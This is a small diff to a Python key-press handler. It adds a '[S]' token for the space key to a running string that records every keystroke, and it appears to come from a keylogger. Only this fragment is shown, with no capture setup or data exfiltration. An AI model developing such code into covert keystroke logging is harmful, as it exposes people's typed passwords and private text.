@@ -44,6 +44,8 @@ def on_press(key):
         log += '[E]'
     elif key == Key.backspace:
         log += '[B]'
+    elif key == Key.space:
+        log += '[S]'
     elif len(str(key)) == 3:
         log += str(key).replace("'", "")
 
